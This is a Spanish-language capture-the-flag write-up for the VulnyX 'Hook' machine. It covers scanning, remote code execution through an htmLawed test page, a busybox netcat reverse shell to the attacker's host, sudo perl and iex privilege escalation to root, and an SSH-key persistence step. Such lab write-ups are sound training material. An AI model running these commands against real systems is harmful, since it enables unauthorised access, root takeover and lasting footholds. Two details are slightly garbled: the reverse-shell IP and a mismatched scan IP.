# WRITEUP - HOOK - VULNYX

![image](https://github.com/user-attachments/assets/9d529618-311b-4268-84d3-8ef762a1b5ca)

## Scanning Network

Escaneamos la red para identificar la IP del equipo a vulnerar:
```shell
 netdiscover -r 192.168.1.0/24
```
E identificamos la ip 192.168.1.56.

Realizamos un escaneo de puertos rápido y sencillo para determinar todos aquellos puertos abiertos en la máquina e identificar posibles vectores de ataque.
```shell
nmap -p- --open --min-rate 5000 -n -Pn 192.168.1.56
```
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 08:00:27:1A:88:10 (Oracle VirtualBox virtual NIC)

Una vez identificados los dos puertos abiertos (ssh, http), realizamos un escaneo más exhaustivo con una lista de scripts de reconocimiento por defecto para determinar los servicios
```shell
nmap -p 22,80 -sVC 192.168.1.56
```
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
    | ssh-hostkey: 
    |   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
    |_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
    80/tcp open  http    Apache httpd 2.4.59 ((Debian))
    |_http-title: Apache2 Debian Default Page: It works
    | http-robots.txt: 1 disallowed entry 
    |_/htmLawed
    |_http-server-header: Apache/2.4.59 (Debian)
    MAC Address: 08:00:27:1A:88:10 (Oracle VirtualBox virtual NIC)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Ya con el nmap, vemos que el servicio tiene una página robots.txt.

Al ser un servicio web por HTTP, podemos realizar un pequeño chequeo de diferentes directorios dentro de la página web, mientras inspeccionamos la página a mano:
```shell
dirb http://192.168.1.55
```
<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hook/Content/dirb.png>

Mientras se ejecuta revisamos la página principal y vemos que es la normal de un servicio Apache. El dirbuster nos ha determinado dos directorios diferentes un robots.txt y un index.html. Dentro del robots.txt nos sugiere otro direccionamiento, por lo que accedemos a revisarlo.

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hook/Content/robots.txt.png>

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hook/Content/htmLawed.png>

Parece la documentación de un script en php que permite procesar texto de HTML. Es una capa de seguridad que puede llegar a neutralizar vulnerabilidades de XSS (crosSite Scripting), en este caso parece deshabilitada.

Si buscamos información, encontraremos un repositorio en github con información adicional: https://github.com/kesar/HTMLawed. Dentro encontramos diferentes scripts php que nos pueden servir, en específico uno que es htmLawed_test.php. Al entrar, vemos un cuadro de texto para probar comandos en JS, y podemos procesarlo o ejecutarlo directamente sobre el navegador. Esto no nos ofrece mucho ya que no tenemos forma de ejcutar código malicioso dentro de la página.
## Exploitation
Buscamos un exploit que pueda vulnerar la máquina y nos deje ejecutar un RCE en el cuadro de texto. Buscando encontramos una PoC, en la cual al enviarle hook=exec, se puede ejecutar comandos en el recuadro de texto

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hook/Content/hook_config.png>

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hook/Content/hook_exploit.png>

Viendo este RCE, vamos a enviarnos una reverse shell a nuestro equipo. Probé diferentes formas y solo me funcionó la reverse shell con el uso de 'BusyBox' y netcat:
```shell
busybox	nc scs4192.168.1.103 445 -e /bin/bash
```
BusyBox es una herramienta de software que proporciona una colección de utilidades de Unix en un único ejecutable compacto, diseñado específicamente para sistemas embebidos o con recursos limitados.

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hook/Content/whoami.png>

## Privilege Escalation

Buscamos escalar privilegios a algún usuario del sistemas
```shell
ls -la /home
```
Vemos un directorio "noname" en el que solo los usuarios y grupos de noname pueden acceder
```shell
sudo -l
```
<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hook/Content/sudo-l.png>

Podemos observar que al chequear los permisos de sudo, tenemos permisos para ejecutar perl como noname y sin contraseña. Si hacemos una búsqueda rápida, veremos que en GTFOBins, hay una entrada para perl:

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hook/Content/GTFObins.png>

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hook/Content/GTFObins_perl.png>

```shell
sudo -u noname /usr/bin/perl -e "exec '/bin/bash'"
```
Una vez siendo noname, podemos leer la flag.

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hook/Content/flag_user.png>

Una vez tenemos la flag, tenemos que escalar los privilegios a root para conseguir un acceso completo, revisando los permisos vemos que podemos ejecutar como root sin contraseña "/usr/bin/iex".

Buscando un poco de información, podemos ver que se pueden ejecutar comandos del sistema dentro de la consola con:
```shell
:os.cmd('command') (con comillas simples, dobles no funciona).
```
<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hook/Content/root_iex.png>

Sabiendo esto, podemos movernos y obtener la flag de root de forma sencilla.


## BONUS
Podemos mantener una persistencia, para no tener que repetir el proceso en caso de volver a conectarse con el usuario, y sin cambiarle la contraseña ni nada, la forma es crear un par clave con ssh-keygen para así, poder conectarnos mediante la clave privada al sistema, las veces que queramos. Creamos las claves con ssh-keygen, y una vez finaliza, copiamos id_rsa (clave privada) la cual será la que usaremos para realizar las conexiones remotas. Por el otro lado, la clave pública será copiada dentro del archivo de la máquina víctima ~/.ssh/authorized_keys.
